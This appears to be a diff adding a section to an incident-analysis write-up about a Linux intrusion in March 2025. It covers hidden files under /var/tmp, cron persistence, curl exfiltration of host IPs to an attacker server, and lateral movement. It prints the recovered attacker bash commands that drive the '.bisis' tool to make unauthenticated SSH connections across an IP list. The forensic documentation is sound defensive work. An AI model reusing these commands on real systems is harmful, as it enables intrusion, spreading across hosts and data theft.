@@ -488,6 +488,94 @@ curl --silent "http://196.251.73.38:47/save-data?IP=103.108.140.172" \\
 - IP `196.251.73.38:47`: **N/A**  
 - IP `103.108.140.172`: **N/A**
 
+---
+
+### March 14 & 17, 2025 — Advanced Lateral Movement & Recon
+
+#### March 14, 2025
+
+**Device Involved:**  
+- `sakel-linux-2`
+
+**Observed Activity:**  
+The `History` script executed `Update` within the `.update-logs` directory, creating `.bisis` and `cache`, followed by execution of the `cache` file.
+
+<p align="center">  
+  <img src="https://github.com/user-attachments/assets/c4f416f2-61a5-4ee8-9302-1fc3f039cf9d" width="700"/>
+  <img src="https://github.com/user-attachments/assets/24e63de5-8840-429c-b10c-9f119c1415cc" width="700"/>
+</p>
+
+**Additional Behavior:**  
+A `cron` job launched `.b`, enabling it to run continuously from `/tmp`, and re-executed the `cache` file.
+
+<p align="center">  
+  <img src="https://github.com/user-attachments/assets/1437548a-13c6-4bcd-92ba-fb7275099c7b" width="700"/>
+</p>
+
+**Exfiltration Activity:**  
+`Update` was executed, followed by a `curl` GET request to `http://196.251.73.38:47/save-data`, exfiltrating the device’s IP (`45.64.186.20`).
+
+<p align="center">  
+  <img src="https://github.com/user-attachments/assets/3c089219-b09e-4c85-a080-a0782ca36cca" width="700"/>
+</p>
+
+#### March 17, 2025
+
+**Activity:**  
+The `Update` file was run again, mirroring the `.b` activity from March 14.
+
+<p align="center">  
+  <img src="https://github.com/user-attachments/assets/6756dbbe-9f5d-4b97-9475-cc4cf4850e6c" width="700"/>
+</p>
+
+**Lateral Movement Behavior:**  
+A bash command was run, leveraging `.bisis` to connect to a list of IPs using SSH without authentication, then executing script `x`.
+
+```bash
+bash -c "
+cd /var/tmp/.update-logs
+chmod +x /var/tmp/.update-logs/.bisis
+ulimit -n 999999
+cat /var/tmp/.update-logs/iplist | /var/tmp/.update-logs/./.bisis ssh -o /var/tmp/.update-logs/data.json --userauth none --timeout 8
+/var/tmp/.update-logs/x
+"
+```
+
+```bash
+/var/tmp/.update-logs/./.bisis ssh \\
+  -o /var/tmp/.update-logs/data.json \\
+  --userauth none \\
+  --timeout 8
+```
+
+<p align="center">  
+  <img src="https://github.com/user-attachments/assets/067ad23e-3d6a-44b7-ae61-9cedc5a0f9a5" width="700"/>
+</p>
+
+**Recon & Lateral Movement:**  
+`.bisis` was used to connect to multiple IP addresses, performing scans and potentially brute-forcing.
+
+<p align="center">  
+  <img src="https://github.com/user-attachments/assets/58b57c3f-d9c8-45f4-8e34-014fe41d24c4" width="700"/>
+  <img src="https://github.com/user-attachments/assets/e8f5d598-68d9-4b86-adda-ed9f1299b869" width="700"/>
+  <img src="https://github.com/user-attachments/assets/19e9e631-9908-441c-8a50-71c48a9d38cc" width="700"/>
+  <img src="https://github.com/user-attachments/assets/b6789f4d-4bc2-47ea-8035-91583df73889" width="700"/>
+</p>
+
+**Final Activity:**  
+`Update` executed another `curl` command, exfiltrating the IP address `200.98.136.217` to `196.251.73.38:47`.
+
+<p align="center">  
+  <img src="https://github.com/user-attachments/assets/8b4825ab-89bd-40ba-819f-2a94d39266c1" width="700"/>
+</p>
+
+**VirusTotal Scores:**
+- `History`: **N/A**  
+- `Update`: **N/A**  
+- `.bisis`: **N/A**  
+- `cache`: **N/A**  
+- `.b`: **N/A**  
+- IP `196.251.73.38:47`: **N/A**
 
 
 
